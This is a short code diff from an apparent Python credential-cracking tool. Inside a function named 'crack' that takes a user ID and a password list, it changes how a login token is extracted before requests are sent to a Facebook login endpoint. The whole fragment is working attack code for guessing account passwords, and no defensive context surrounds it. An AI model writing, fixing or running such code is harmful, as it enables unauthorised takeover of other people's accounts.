@@ -194,7 +194,7 @@ def crack(uid, password_list, total_count):
             '__csr':'',
             '__req':random.choice(['1', '2', '3', '4', '5', '6', '7', '8', '9']),
             '__fmt':'1',
-            '__a':re.search('"encrypted":"(.*?)"',str(requ)).group(1),
+            '__a':re.search('"encrypted":"(.*?)"',str(requu1.text)).group(1),
             '__user':'0'
             }
             url = "https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
